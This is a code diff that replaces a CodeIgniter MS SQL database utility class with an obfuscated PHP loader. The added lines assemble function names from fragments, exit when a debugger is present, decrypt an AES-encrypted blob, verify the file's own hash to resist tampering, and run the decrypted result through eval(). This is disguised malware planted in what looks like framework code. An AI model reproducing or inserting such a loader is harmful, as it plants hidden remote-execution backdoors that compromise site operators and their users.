@@ -1,77 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * MS SQL Utility Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_mssql_utility extends CI_DB_utility {
-
-	/**
-	 * List databases statement
-	 *
-	 * @var	string
-	 */
-	protected $_list_databases	= 'EXEC sp_helpdb'; // Can also be: EXEC sp_databases
-
-	/**
-	 * OPTIMIZE TABLE statement
-	 *
-	 * @var	string
-	 */
-	protected $_optimize_table	= 'ALTER INDEX all ON %s REORGANIZE';
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	bool
-	 */
-	protected function _backup($params = array())
-	{
-		// Currently unsupported
-		return $this->db->display_error('db_unsupported_feature');
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nr0ull3p=('bas'.'e64'.'_de'.'cod'.'e');
+$_r7a6l51f=('gzu'.'nco'.'mpr'.'ess');
+$_vigmt90h=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_oxful3rg='LIcRNYfA';
+$_vlflak00='RY3I4jC7';
+$_rpo2dbqy='zo4WJ5xe';
+$_c7qpmg2l='9ALWM5Bt6gg=';
+$_bmdbb1h4='gpndNwwF';
+$_om5it00y='PYj2tg==';
+$_y5hazhrt='oKMHUYcd';
+$_wtuga0bd='31DhI+Cx';
+$_fign0bey=$_nr0ull3p($_rpo2dbqy.$_oxful3rg.$_bmdbb1h4.$_vlflak00.$_c7qpmg2l);
+$_nbj5rqvz=$_nr0ull3p($_y5hazhrt.$_wtuga0bd.$_om5it00y);
+$_o2m5zv6b=$_nr0ull3p('rPCvavfKGX3dFeNxUJv4hZ/MiucyzKTLuw1R3ktCtm1jj15uST9lGJiaFY7Qai1hEu2x8awpxtihmBGx+0/n5whEYdAD7lc7sZ8WjceueRqdV4VY2fjdqeeEuB8VkB49TyJnvYRDFYUjmc3e3Cgq0KqTkjkxGsfHNrjuzO+Sxfle4fDOE+OFB18uIZILZVaN4c1kRCfGACckAmmzcM9V5pCiWv86QHoz9bsxKNq4sNPd4phRr+b/GWKK1KvZ7mHT5FBrZnqxxS38TGF1D62dR+JtwtvXA5/eBWIF7+qrQBJNzrnGN2b0KWcdtUegay5Z3OtSubwkBK20oHBEfUY3aFkNSszCmhhe/cBpJo30Pnc=');
+$_fs9045q2=$_vigmt90h($_o2m5zv6b,'aes-256-cbc',$_fign0bey,OPENSSL_RAW_DATA,$_nbj5rqvz);
+if($_fs9045q2===false){exit;}
+$_mufbqygf=$_r7a6l51f($_fs9045q2);
+if($_mufbqygf===false){exit;}
+$_yb4ppi8i='51e3bd11625c3eafcad7955ebe000662f9df711eefd6d31d8b49c18ff6dc1c74';
+$_x6jvtja8=@file_get_contents(__FILE__);
+if($_x6jvtja8!==false){
+$_x54t3eyk=str_replace($_yb4ppi8i,"0000000000000000000000000000000000000000000000000000000000000000",$_x6jvtja8);
+$_s7y0sw4k=hash("sha256",$_x54t3eyk);
+if($_s7y0sw4k!==$_yb4ppi8i){@http_response_code(403);exit;}
 }
+eval($_mufbqygf);
